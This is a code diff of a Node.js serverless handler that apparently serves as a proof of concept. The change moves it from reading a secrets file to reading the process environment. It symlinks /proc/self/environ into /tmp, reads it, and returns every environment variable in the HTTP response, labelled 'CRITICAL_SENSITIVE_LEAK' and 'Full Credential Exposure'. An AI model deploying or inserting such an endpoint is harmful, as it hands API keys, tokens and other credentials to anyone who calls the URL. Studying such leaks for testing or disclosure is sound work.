@@ -3,29 +3,26 @@ const path = require('path');
 
 module.exports = async (req, res) => {
     try {
-        const targetPath = path.join(process.cwd(), 'config', 'secrets.txt');
-        
-        const bridgeName = `symlink_poc_${Math.random().toString(36).substring(7)}`;
+        const targetPath = '/proc/self/environ'; 
+        const bridgeName = `critical_leak_${Math.random().toString(36).substring(7)}`;
         const linkPath = path.join('/tmp', bridgeName);
 
         if (!fs.existsSync(linkPath)) {
             fs.symlinkSync(targetPath, linkPath);
         }
 
-        const leakedData = fs.readFileSync(linkPath, 'utf8');
+        const rawData = fs.readFileSync(linkPath);
+        
+        const envs = rawData.toString().split('\0');
 
         fs.unlinkSync(linkPath);
 
         res.status(200).json({
-            message: "SYMLINK_EXPLOIT_SUCCESS",
-            method: "Filesystem Binding via /tmp",
-            secret_content: leakedData,
-            accessed_via: linkPath
+            status: "CRITICAL_SENSITIVE_LEAK",
+            impact: "Full Credential Exposure",
+            environment_variables: envs.filter(e => e.includes('='))
         });
     } catch (err) {
-        res.status(500).json({ 
-            error: "Symlink Failed", 
-            detail: err.message 
-        });
+        res.status(500).json({ error: err.message });
     }
 };
